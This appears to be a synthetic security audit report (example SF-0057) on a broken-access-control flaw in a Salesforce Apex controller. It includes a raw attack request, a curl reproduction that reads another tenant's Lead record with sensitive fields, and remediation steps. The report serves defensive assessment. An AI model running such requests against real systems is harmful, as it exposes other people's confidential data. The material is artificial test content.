# Security Analysis Report
**System:** ManuControl Robotics Fleet (Salesforce-Integrated)
**Domain:** Industrial IoT / Robotics Fleet
**Example ID:** SF-0057
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant / cross-tenant access on `LeadController.getLeadData` — attacker reads Lead records belonging to another tenant |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Lead Object (Pattern 1.5)

### Summary
The Apex controller `LeadController` on ManuControl Robotics Fleet (`e70317ef.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 1.5, multi-tenant isolation is broken — an attacker reads Lead `00117EF` belonging to another user by substituting `leadId`. In an industrial IoT/robotics context, Lead records may represent equipment vendor leads, maintenance contracts, and operator PII.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` while the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://e70317ef.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://e70317ef.lightning.force.com/aura
Authorization: Bearer 00DE70317EF!ARe70317ef...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DE70317EF!ARe70317ef...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"00117EF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00117EF", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-91-7749"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DE70317EF!ARe70317ef..."
curl -s -X POST "https://e70317ef.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"00117EF","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-91-7749
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
